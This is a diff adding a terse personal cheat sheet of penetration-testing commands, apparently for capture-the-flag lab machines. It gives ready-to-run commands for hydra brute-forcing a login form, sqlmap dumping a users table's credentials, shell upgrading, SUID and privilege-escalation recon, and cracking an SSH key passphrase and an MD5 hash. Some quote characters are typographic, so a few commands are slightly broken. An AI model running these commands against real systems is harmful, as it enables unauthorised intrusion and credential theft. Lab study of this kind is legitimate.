@@ -1,0 +1,84 @@
+sudo nmap -O 10.0.2.4   /// check OS
+
+sudo nmap -sS 10.0.2.4   // check all ports or -sV
+
+check services on specific port
+telnet ip port
+
+sudo ip neighbor   // check all other ip
+
+
+// check all valid paths
+dirb http://10.10.10.2
+nikto -h 10.0.2.4
+
+
+https://gchq.github.io/CyberChef/
+
+https://md5decrypt.net/en/HashFinder/           -hash finder
+
+ // Image steganography 
+https://www.exifdata.com
+strings image
+binwalk -e imagename
+java -jar stegsolve.jar 
+
+
+
+Brute force attack for key using a word list (check if result shloud not contain invalid key)
+hydra -l “” -P /usr/share/dirb/wordlists/big.txt 10.10.10.2 http-post-form “/kzMb5nVYJw/index.php:key=^PASS^&Login=Login:invalid key” -f -V
+
+
+Find db names available using sqlmap
+sqlmap -u “http://10.10.10.2/kzMb5nVYJw/420search.php?usrtosearch=a" — dbs
+
+available tables
+sqlmap -u "http://10.0.2.4/kzMb5nVYJw/420search.php?usrtosearch=admin" -D seth --tables
+
+available columns
+sqlmap -u "http://10.0.2.4/kzMb5nVYJw/420search.php?usrtosearch=admin" -D seth -T users --columns
+
+entries from table
+sqlmap -u "http://10.0.2.4/kzMb5nVYJw/420search.php?usrtosearch=admin" -D seth -T users -C user,pass --dump
+
+ssh to machine user@ip -p port
+ssh ramses@10.10.10.2 -p 777
+
+updating ps command with ls command(symbolic link)
+ln -s /bin/ls ps
+export PATH=`pwd`:${PATH}
+rm ps  (delete prev command)
+
+
+//shell to bash
+python
+import pty; pty.spawn(“/bin/bash”)
+or /usr/bin/python2.7 -c ‘import pty;pty.spawn(“/bin/sh”)’
+
+
+//check binaries with SUID permissions
+find / -perm -u=s -type f 2>/dev/null
+
+
+//check version and kernal of system
+    uname -a
+    cat /etc/issue
+
+
+//find files for specific user
+find / -user devops 2>/dev/null
+
+//find rsa key hash and passphrase
+python /usr/share/john/ssh2john.py id_rsa1 > id_rsa1.hash
+john id_rsa1.hash -wordlist=/usr/share/wordlists/rockyou.txt
+
+// find flags(files with some name)
+find / -type f -name "*flag*"
+
+// md5 hash decode
+hashcat -m 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt
+
+// from java.class file --> java diassaembler
+
+
+
